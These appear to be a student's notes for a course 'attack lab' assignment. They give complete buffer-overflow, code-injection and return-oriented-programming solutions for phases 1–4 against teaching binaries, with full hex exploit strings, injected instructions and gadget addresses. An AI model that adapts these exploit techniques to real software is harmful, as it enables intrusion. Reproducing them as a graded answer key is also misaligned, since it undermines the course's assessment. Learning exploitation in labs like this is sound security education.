first few phases in ctarget, the rest in rtarget

![[Pasted image 20241023124541.png]]

objdump 

gotcha: if any of your address contain the byte 0a it will not work because that is the return character
if any of your addresses have 0a in it just get a new target/make a post on piazza

this uses little endian so you have to reverse the addresses of the methods

## Phase 1
bigger than the amount of space getbuf thinks we will use
![[Pasted image 20241023124128.png]]
mine is 0x28, space needed to waste

touch1 requires no arguments

hex2raw helps

basically waste 0x28 worth of space and then call the address of touch1

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
87 19 40 00 00 00 00 00
```

## Phase 2
Basically you make a phase_2.s file to write assembly code easier
You manually move your cookie value into %rdi (which is always the first argument for a function)
ret 

Now that you have the assembly code you need to disassemble it into hex instructions for hex2raw
An easy way to do this is use gcc -c phase_2.s which will create a phase_2.o file
objdump -d phase_2.o > phase_2.d

![[Pasted image 20241028165158.png]]

Take this code and put it (one line + c3) as the first line in phase_2.txt
Pad with 0's to overflow
Call the rsp address (which you can find by running the program in gdb, breaking getbuf, and putting in a string longer than 24 characters to overflow, then p $rsp)
Call the touch2 address

This solution probably fails on the server because the number of instructions is not divisible by 16. If that happens try calling rsp twice

```
48 c7 c7 68 ae 92 4c c3 /* move cookie into %rdi and return */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 e4 64 55 00 00 00 00 /* rsp address */
98 e4 64 55 00 00 00 00
b3 19 40 00 00 00 00 00 /* touch2 */
```

## Phase 3
Basically checks to see if your cookie matches the passed in argument?

1st instruction
0x5564e498 + padding to get to cookie string (which is 8 x how many lines in between your 1st instruction and the ending line with the cookie value)
0x5564e498 + 64 = 0x5564E4D8

buffer

%eax backwards
5564e498
98 e4 64 55
maybe repeat for server verification

touch3 address but backwards

put cookie value (converted into hex numbers) in as last line
0x4c92ae68 -> 34 63 39 32 61 65 36 38

```
48 c7 c7 d8 e4 64 55 c3 /* mov %eax + buffer into %rdi */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
98 e4 64 55 00 00 00 00 /* %eax address backwards */
98 e4 64 55 00 00 00 00 /* repeat for server verification */
88 1a 40 00 00 00 00 00 /* touch3 address */
34 63 39 32 61 65 36 38 /* cookie string */
```

## Phase 4
Basically the problem is that the way rtarget is set up it will NOT read anything off the stack, so if you put stuff there it's just nonexistent. You have to take advantage of the gadgets to read data off the stack and move it into registers

Take move instructions -> reference table -> **find gadget with that as an instruction**
Push those function addresses

To get the specific instructions you want, you can call the address at the function address + the number of bytes into the function
![[Pasted image 20241030131818.png]]

First gadget pops rax
![[Pasted image 20241030131112.png]]
Second gadget moves rax into rdi
![[Pasted image 20241030131151.png]]

GETTING 58:
![[Pasted image 20241030131916.png]]
Ends in 58, 6 bytes in, so 0x401b36 + 0x5 = 0x401b3b <--- ADDRESS
0000000000401b3b
3b 1b 40 00 00 00 00 00

GETTING 48 89 C7: (this one works because 90 is just no instruction, doesn't matter)
![[Pasted image 20241030132527.png]]
0x401b44 + 0x2 = 0x401b46 <--- ADDRESS
0000000000401b46
46 1b 40 00 00 00 00 00

GETTING TOUCH2:
00000000004019b3
b3 19 40 00 00 00 00 00

GETTING COOKIE:
0x4c92ae68 <--- cookie value
68 ae 92 4c


Empty buffer
After buffer is gadget 1 address, use cookie, address 2, touch2 address
Gadget 1 pops the first thing off the stack (which is the thing in line 7) into %rax, which is why we have the literal cookie on line 7, then gadget 2 will move rax into rdi for touch2

Buffer
gadget 1 address (which is just the one with 58 as the argument value)
Cookie (literally just the cookie backwards because little endian)
gadget 2 address (which is just the one with 48 89 c7 as the argument)
touch2 address 

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3b 1b 40 00 00 00 00 00 /* gadget 1, pop %rax */
68 ae 92 4c 00 00 00 00 /* cookie backwards */
46 1b 40 00 00 00 00 00 /* gadget 2, movq %rax, %rdi */
b3 19 40 00 00 00 00 00 /* touch2 address */
```
